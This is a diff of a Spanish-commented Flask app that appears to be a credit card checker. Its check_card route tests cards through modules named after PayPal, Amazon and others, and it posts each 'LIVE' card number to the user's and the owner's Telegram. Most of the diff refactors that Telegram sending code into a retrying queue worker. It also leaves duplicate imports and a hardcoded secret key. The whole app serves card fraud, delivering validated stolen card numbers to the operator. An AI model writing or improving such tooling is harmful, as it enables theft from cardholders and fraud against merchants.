@@ -11,7 +11,11 @@ from telegram import Bot
 import requests as req
 import paypal
 import tec, red, em, amazon,ultra,paypal
-
+import asyncio
+import threading
+import time
+from telegram import Bot
+from telegram.error import TelegramError, RetryAfter, TimedOut, NetworkError
 
 app = Flask(__name__)
 app.secret_key = 'tu_secreto_super_seguro'
@@ -209,58 +213,72 @@ import asyncio
 from telegram.error import BadRequest
 
 # Limita la concurrencia para evitar saturar pool HTTP
-semaphore = asyncio.Semaphore(5)  # Ajusta este número según tu pool HTTP
+import asyncio
+from telegram.error import BadRequest
+
+# Límite de concurrencia (máx. 5 envíos simultáneos)
+semaphore = asyncio.Semaphore(5)
 
 async def send_message(chat_id, message):
-    async with semaphore:
+    async with semaphore:  # Controla cuántos envíos simultáneos
         try:
             await bot.send_message(chat_id=chat_id, text=message)
-            print(f"Mensaje enviado a {chat_id}")
+            print(f"✅ Mensaje enviado a {chat_id}")
             return True
+
         except BadRequest as e:
             if "Chat not found" in str(e):
-                print(f"Chat no encontrado para ID {chat_id}. Eliminando telegram_id de usuario...")
+                print(f"⚠ Chat no encontrado: {chat_id} — eliminando de la base de datos")
                 user = db.session.query(User).filter_by(telegram_id=str(chat_id)).first()
                 if user:
                     user.telegram_id = None
                     try:
                         db.session.commit()
-                        print(f"Telegram ID {chat_id} eliminado de usuario {user.id}")
+                        print(f"✔ Telegram ID {chat_id} eliminado para usuario {user.id}")
                     except Exception as err:
                         db.session.rollback()
-                        print(f"Error al eliminar telegram_id: {err}")
+                        print(f"❌ Error al eliminar telegram_id: {err}")
                 return False
             else:
-                print(f"Error enviando mensaje a {chat_id}: {e}")
+                print(f"❌ Error enviando mensaje a {chat_id}: {e}")
                 return False
+
         except Exception as e:
-            print(f"Error enviando mensaje a {chat_id}: {e}")
+            print(f"❌ Error inesperado enviando mensaje a {chat_id}: {e}")
             return False
 
+
 async def send_all_messages(telegram_ids, message):
+    # Evita duplicados y mensajes a IDs inválidos
+    telegram_ids = list(set(filter(lambda x: x is not None, telegram_ids)))
+
     tasks = [send_message(tid, message) for tid in telegram_ids]
-    results = await asyncio.gather(*tasks)
+    results = await asyncio.gather(*tasks, return_exceptions=False)
     return all(results)
+
 
 def send_messages_to_multiple(telegram_ids, message):
     if not isinstance(telegram_ids, list):
         telegram_ids = [telegram_ids]
 
     try:
-        loop = None
         try:
             loop = asyncio.get_running_loop()
         except RuntimeError:
-            pass
+            loop = None
 
         if loop and loop.is_running():
+            # Si ya hay un loop corriendo (por ejemplo, en un bot asíncrono)
             future = asyncio.run_coroutine_threadsafe(send_all_messages(telegram_ids, message), loop)
             return future.result()
         else:
+            # Si no hay loop, lo creamos y ejecutamos
             return asyncio.run(send_all_messages(telegram_ids, message))
+
     except Exception as e:
-        print(f"Error enviando mensajes: {e}")
+        print(f"❌ Error enviando mensajes: {e}")
         return False
+
 
 
 
@@ -406,7 +424,7 @@ def check_card():
             if user and user.telegram_id:
                 telegram_ids.add(user.telegram_id)
             telegram_ids.add(OWNER_TELEGRAM_ID)
-            send_messages_to_multiple(list(telegram_ids), f"✅ 𝗟𝗜𝗩𝗘 - {result['cc']}\n{result['message']}")
+            send_messages_to_multiples(list(telegram_ids), f"✅ 𝗟𝗜𝗩𝗘 - {result['cc']}\n{result['message']}")
 
 
         return jsonify(result)
@@ -415,12 +433,61 @@ def check_card():
 
 import asyncio
 
-async def enviarmensajecchats(message, chat_ids):
-    for chat_id in chat_ids:
-        try:
-            await bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
-        except Exception as e:
-            print(f"Error enviando mensaje a {chat_id}: {e}")
+message_queue = asyncio.Queue()
+sending_task_started = False
+
+import asyncio
+import threading
+from telegram import Bot
+
+bot = Bot(token=TELEGRAM_BOT_TOKEN)
+
+message_queue = asyncio.Queue()
+loop = asyncio.new_event_loop()  # loop exclusivo para el dispatcher
+
+async def _send_message_worker():
+    while True:
+        chat_id, text = await message_queue.get()
+        retries = 0
+        while retries < 5:
+            try:
+                await bot.send_message(chat_id=chat_id, text=text)
+                print(f"✅ Mensaje enviado a {chat_id}")
+                break
+            except Exception as e:
+                retries += 1
+                wait = 3 * retries
+                print(f"🌐 Problema de red con {chat_id}, reintentando en {wait}s ({retries}/5)")
+                await asyncio.sleep(wait)
+        else:
+            print(f"❌ No se pudo enviar el mensaje a {chat_id} después de 5 intentos.")
+        await asyncio.sleep(1)  # delay entre mensajes
+        message_queue.task_done()
+
+def start_dispatcher_thread():
+    """Inicia el hilo del loop que ejecuta el worker"""
+    def runner():
+        asyncio.set_event_loop(loop)
+        loop.create_task(_send_message_worker())
+        loop.run_forever()
+    
+    thread = threading.Thread(target=runner, daemon=True)
+    thread.start()
+
+# Llamar esto una vez al iniciar la app
+start_dispatcher_thread()
+
+def send_messages_to_multiples(chat_ids, text):
+    """Agrega los mensajes a la cola sin importar en qué hilo se llame"""
+    if not isinstance(chat_ids, list):
+        chat_ids = [chat_ids]
+    for cid in chat_ids:
+        asyncio.run_coroutine_threadsafe(message_queue.put((cid, text)), loop)
+
+
+
+import asyncio
+
 
 
 
